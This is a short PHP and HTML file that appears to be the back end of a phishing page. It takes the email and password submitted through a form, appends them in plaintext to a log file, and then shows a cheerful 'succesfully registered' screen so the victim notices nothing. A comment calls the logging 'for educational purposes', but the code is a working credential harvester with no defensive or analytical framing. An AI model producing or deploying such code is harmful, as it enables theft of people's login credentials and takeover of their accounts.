<?php
    $email = $_POST['email'];
    $password = $_POST['password'];
    
    // Log the captured data (for educational purposes)
    $file = fopen("log.txt", "a");
    fwrite($file, "Email: $email | Password: $password\n");
    fclose($file);
    
    // echo "Login failed. Please try again.";

?>

<!-- <style>
  @keyframes fadeIn {
    0% { opacity: 0; }
    100% { opacity: 1; }
  }
</style> -->

<div style="position: absolute; top: 0; left: 0; width: 100%; height: 100vh; background: linear-gradient(to bottom, #ff99cc, #ffff99); animation: fadeIn 2s ease-in-out;">
<h1> succesfully registered  </h1>

</div>

<?php

?>